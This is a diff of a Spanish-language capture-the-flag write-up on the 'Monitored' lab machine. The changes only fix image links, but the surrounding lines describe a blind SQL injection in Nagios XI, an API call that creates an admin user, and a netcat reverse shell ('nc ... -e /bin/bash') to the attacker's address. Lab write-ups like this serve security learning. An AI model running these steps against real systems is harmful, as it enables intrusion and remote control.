@@ -40,7 +40,7 @@ PORT     STATE SERVICE    VERSION
 
 Entramos al puerto 443 y vemos un panel de login.
 
-([Pasted image 20240226163529.png](https://github.com/Hamibubu/Writeups/blob/main/MonitoredWriteup/Pasted%20image%2020240226163529.png))
+(![Pasted image 20240226163529.png](https://github.com/Hamibubu/Writeups/blob/main/MonitoredWriteup/Pasted%20image%2020240226163529.png))
 
 Enumeramos con ffuf
 
@@ -146,7 +146,7 @@ Podemos ver que es aprovechándonos de lo siguiente:
 
 Con esto me pongo a probar la vulnerabilidad en burpsuite y posteriormente cree un script, parece ser una blind sqli
 
-[Imagen](https://github.com/Hamibubu/Writeups/blob/main/MonitoredWriteup/Pasted%20image%2020240228170012.png)
+![Imagen](https://github.com/Hamibubu/Writeups/blob/main/MonitoredWriteup/Pasted%20image%2020240228170012.png)
 
 Adjunto también el [script](https://github.com/Hamibubu/CVE-2023-48084) con el que consigo dumpear todo
 
@@ -161,7 +161,7 @@ curl -XPOST "http://monitored.htb/nagiosxi/api/v1/system/user?apikey=<api_key>&p
 
 Con esto gano admin access y hay una RCE que se puede aprovecharse, podemos crear comandos que queramos
 
-[Pasted image 20240228170903.png](https://github.com/Hamibubu/Writeups/blob/main/MonitoredWriteup/Pasted%20image%2020240228170903.png)
+![Pasted image 20240228170903.png](https://github.com/Hamibubu/Writeups/blob/main/MonitoredWriteup/Pasted%20image%2020240228170903.png)
 
 Aplicamos la configuración y ahora escuchamos con netcat
 
@@ -169,7 +169,7 @@ Aplicamos la configuración y ahora escuchamos con netcat
 nc -lvnp 6666
 ~~~
 
-[IMG](https://github.com/Hamibubu/Writeups/blob/main/MonitoredWriteup/Pasted%20image%2020240228171117.png)
+![IMG](https://github.com/Hamibubu/Writeups/blob/main/MonitoredWriteup/Pasted%20image%2020240228171117.png)
 
 Ejecutamos el comando con, netcat al parecer es con el que funciona `nc 10.10.15.2 6666 -e /bin/bash`
 
